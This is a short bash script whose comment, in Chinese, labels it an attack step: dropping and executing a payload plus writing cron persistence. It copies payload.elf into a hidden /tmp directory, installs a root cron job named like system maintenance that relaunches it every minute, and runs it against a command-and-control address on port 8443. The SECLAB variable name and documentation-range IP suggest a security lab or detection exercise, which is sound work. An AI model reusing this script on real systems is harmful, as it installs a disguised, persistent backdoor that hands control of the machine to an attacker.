#!/usr/bin/env bash
# attack（窗口内）：投放执行 + cron 驻留写入。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp payload.elf /tmp/.cache/sysupd/payload.elf && chmod 0755 /tmp/.cache/sysupd/payload.elf
printf '* * * * * root /tmp/.cache/sysupd/payload.elf %s 8443\n' "$C2_IP" > /etc/cron.d/sysupd-maint
/tmp/.cache/sysupd/payload.elf "$C2_IP" 8443
